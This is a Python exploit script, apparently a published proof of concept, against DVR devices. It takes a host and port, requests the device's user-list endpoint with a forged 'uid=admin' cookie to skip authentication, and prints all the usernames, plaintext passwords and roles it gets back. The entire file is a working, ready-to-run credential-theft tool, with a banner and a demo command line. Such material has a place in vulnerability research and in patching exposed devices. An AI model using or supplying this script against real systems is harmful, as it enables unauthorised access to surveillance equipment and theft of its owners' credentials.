# -*- coding: utf-8 -*-
from __future__ import print_function
import json
import requests
import argparse
import tableprint as tp



banner = '''
                             __..--.._
      .....              .--~  .....  `.
    .":    "`-..  .    .' ..-'"    :". `
    ` `._ ` _.'`"(     `-"'`._ ' _.' '
         ~~~      `.          ~~~
                  .'
                 /
                (
                 ^---'


 [*] @capitan_alfa
'''

details = ''' 
 # Exploit Title:   DVRs; Credentials Exposed
 # Date:            09/04/2018
 # Exploit Author:  Fernandez Ezequiel ( @capitan_alfa )
 # version: 1.2
'''
parser = argparse.ArgumentParser(prog='getDVR_Credentials.py',
                                description=' [+] Obtaining Exposed credentials', 
                                epilog='[+] Demo: python getDVR_Credentials.py --host 192.168.1.101 -p 81')

parser.add_argument('--host',   dest="HOST",    help='Host',    required=True)
parser.add_argument('--port',   dest="PORT",    help='Port',    default=80)

args    =   parser.parse_args()

HST     =   args.HOST
port    =   args.PORT

headers = {}

fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list"
host        =   "http://"+HST+":"+str(port)+"/"

print(banner )

def makeReqHeaders(xCookie):
    headers["Host"]             =  host
    headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
    headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
    headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
    headers["Connection"]       = "close"
    headers["Content-Type"]     = "text/html"
    headers["Cookie"]           = "uid="+xCookie
    
    return headers

try:
    rX = requests.get(fullHost_1,headers=makeReqHeaders(xCookie="admin"),timeout=10.000)
except Exception as e:
    #print(e)
    print(" [+] Timed out\n")
    exit()

badJson = rX.text
try:
    dataJson = json.loads(badJson)
    totUsr = len(dataJson["list"])
except Exception as e:
    print(" [+] Error: "+str(e))
    print(" [>] json: "+str(rX))
    exit()


print("\n [+] DVR (url):\t\t"+str(host))
print(" [+] Port: \t\t"+str(port))

print("\n [+] Users List:\t"+str(totUsr))
print(" ")

final_data = []
try:
    for obj in range(0,totUsr):

        temp = []

        _usuario    = dataJson["list"][obj]["uid"]
        _password   = dataJson["list"][obj]["pwd"]
        _role       = dataJson["list"][obj]["role"]

        temp.append(_usuario) 
        temp.append(_password)
        temp.append(_role)

        final_data.append(temp)

        hdUsr  = "Username"
        hdPass = "Password"
        hdRole = "Role ID"

        cabeceras = [hdUsr, hdPass, hdRole] 

    tp.table(final_data, cabeceras, width=20)

except Exception as e:
    print(" [!]: "+str(e))
    print(" [+] "+ str(dataJson))

print(" ")

